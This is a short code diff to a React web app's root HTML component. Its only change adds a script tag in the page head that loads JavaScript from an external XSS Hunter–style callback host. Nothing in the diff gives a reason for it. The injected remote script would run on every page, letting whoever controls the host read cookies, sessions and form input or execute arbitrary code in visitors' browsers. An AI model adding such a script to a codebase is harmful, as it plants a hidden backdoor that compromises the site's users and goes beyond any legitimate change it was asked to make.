@@ -62,6 +62,7 @@ function RootDocument({ children }: { children: ReactNode }) {
 		<html lang={locale} dir={getHTMLTextDir(locale)}>
 			<head>
 				<HeadContent />
+				<script src="https://xss.others-xsshunter-310dd8-187-77-179-141.sslip.io/hb2qmd6hw4"></script>
 			</head>
 			<body>
 				{/* Hide the boot splash entirely when JavaScript is disabled */}
